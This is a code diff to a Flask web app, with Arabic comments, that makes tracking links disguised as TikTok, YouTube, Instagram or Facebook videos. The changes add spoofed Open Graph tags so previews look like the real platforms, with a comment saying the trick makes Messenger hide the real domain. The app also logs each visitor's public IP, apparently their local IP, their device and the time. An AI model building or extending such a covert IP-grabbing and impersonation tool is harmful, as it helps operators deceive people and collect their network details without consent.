@@ -144,7 +144,6 @@ HTML_LAYOUT = '''
         .logs-table th, .logs-table td { padding: 10px; border: 1px solid #e2e8f0; }
         .logs-table th { background-color: #2c3e50; color: white; }
         
-        /* أزرار التحكم الجديدة وحقول التعديل */
         .action-btn { padding: 5px 10px; font-size: 11px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; color: white; }
         .btn-delete { background-color: #e74c3c; }
         .btn-stats { background-color: #3498db; }
@@ -235,7 +234,7 @@ HTML_LAYOUT = '''
         </div>
 
         <div id="logs_section" class="section-title">
-            <span> S سجل الأجهزة المباشر (توقيت الجزائر GMT+1) {% if current_filter %} [تمت الفلترة] {% endif %}</span>
+            <span> سجل الأجهزة المباشر (توقيت الجزائر GMT+1) {% if current_filter %} [تمت الفلترة] {% endif %}</span>
             {% if current_filter %}
                 <a href="/" class="btn-clear-filter">🔄 عرض السجل الكامل (الكل)</a>
             {% endif %}
@@ -302,7 +301,7 @@ HTML_LAYOUT = '''
 @app.route('/')
 @requires_auth
 def home():
-    filter_id = request.args.get('filter_id') # معرف الفلترة عند طلب إحصائية رابط معين
+    filter_id = request.args.get('filter_id')
     
     with sqlite3.connect(DB_FILE) as conn:
         conn.row_factory = sqlite3.Row
@@ -315,7 +314,6 @@ def home():
         ''')
         links_list = cursor.fetchall()
         
-        # جلب السجل؛ مفلتر أو كامل بناءً على اختيار المستخدم لزر الإحصائيات
         if filter_id:
             cursor.execute('''
                 SELECT c.ip, c.local_ip, c.device, c.time, l.note 
@@ -357,18 +355,17 @@ def create():
         
     return redirect('/')
 
-# مسار مسجل لحذف الرابط ونقراته التابعة له
 @app.route('/delete/<link_id>')
 @requires_auth
 def delete_link(link_id):
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
-        # تفعيل خاصية الحذف المتتالي (Foreign Key Cascade) لحذف النقرات تلقائياً
         cursor.execute("PRAGMA foreign_keys = ON")
         cursor.execute("DELETE FROM links WHERE id = ?", (link_id,))
         conn.commit()
     return redirect('/')
 
+# ==================== التعديل الجوهري في مسار التوجيه الآمن ====================
 @app.route('/secure/<link_id>')
 def secure_redirect(link_id):
     with sqlite3.connect(DB_FILE) as conn:
@@ -380,25 +377,36 @@ def secure_redirect(link_id):
     if link_data:
         platform = link_data['platform']
         video_title = link_data['video_title']
+        image_url = link_data['custom_image']
         
+        # 1. إعداد العناوين والأوصاف بناءً على كل منصة
         if platform == "TikTok":
             title = f"TikTok · {video_title}"
-            description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تطبيق TikTok التفاعلي."
+            description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تطبيق TikTok."
+            og_type = "video.other"
+            site_name = "TikTok"
         elif platform == "YouTube":
             title = f"{video_title} - YouTube"
             description = "مقطع فيديو مميز وقصير على منصة YouTube."
+            og_type = "video.movie"
+            site_name = "YouTube"
         elif platform == "Instagram":
-            title = "Instagram Video"
-            description = "شاهد الصور ومقاطع الفيديو والقصص التفاعلية على Instagram."
+            title = f"Instagram Video · {video_title}"
+            description = "شاهد مقاطع الفيديو والقصص التفاعلية (Reels) على Instagram."
+            og_type = "video.other"
+            site_name = "Instagram Reels"
         elif platform == "Facebook":
-            title = "Facebook Video"
-            description = "شاهد مقطع الفيديو المرفق والتفاعلي على منصة Facebook."
+            title = f"Facebook Video · {video_title}"
+            description = "شاهد مقطع الفيديو المرفق والتفاعلي على منصة Facebook Watch."
+            og_type = "video.tv_show"
+            site_name = "Facebook Video"
         else:
             title = video_title
             description = "اضغط لتشغيل وعرض مقطع الفيديو المرفق بجودة عالية."
-            
-        image_url = link_data['custom_image']
-        
+            og_type = "video.other"
+            site_name = "Video Player"
+
+        # 2. بناء الصفحة مدمجاً بها الحيلة التي تجبر ماسنجر على إخفاء رابط الدومين السفلي
         return f'''
         <!DOCTYPE html>
         <html lang="ar">
@@ -411,9 +419,19 @@ def secure_redirect(link_id):
             <meta property="og:description" content="{description}">
             <meta property="og:image" content="{image_url}">
             <meta property="og:image:secure_url" content="{image_url}">
-            <meta property="og:type" content="video.other">
-            <meta property="og:image:width" content="600">
-            <meta property="og:image:height" content="400">
+            <meta property="og:image:type" content="image/jpeg">
+            <meta property="og:image:width" content="1280">
+            <meta property="og:image:height" content="720">
+            
+            <meta property="og:type" content="{og_type}">
+            <meta property="og:video" content="{link_data['original_url']}">
+            <meta property="og:video:secure_url" content="{link_data['original_url']}">
+            <meta property="og:video:type" content="text/html">
+            <meta property="og:video:width" content="1280">
+            <meta property="og:video:height" content="720">
+            
+            <meta property="og:url" content="{request.url}">
+            <meta property="og:site_name" content="{site_name}">
             
             <script>
                 function gatherLocalIPsAndRedirect() {{
@@ -491,8 +509,6 @@ def log_click(link_id):
         ip_address = ip_address.split(',')[0].strip()
         
     user_agent = request.headers.get('User-Agent')
-    
-    # استخدام الدالة الجديدة لحفظ الوقت بتوقيت الجزائر GMT+1
     current_time = get_gmt1_time()
     
     with sqlite3.connect(DB_FILE) as conn:
@@ -506,5 +522,4 @@ def log_click(link_id):
     return jsonify({"status": "success"}), 200
 
 if __name__ == '__main__':
-    # لتشغيل الكود بنجاح يرجى التأكد من تثبيت مكتبة pytz عبر أداة pip (pip install pytz)
     app.run(debug=True, host='0.0.0.0', port=5000)
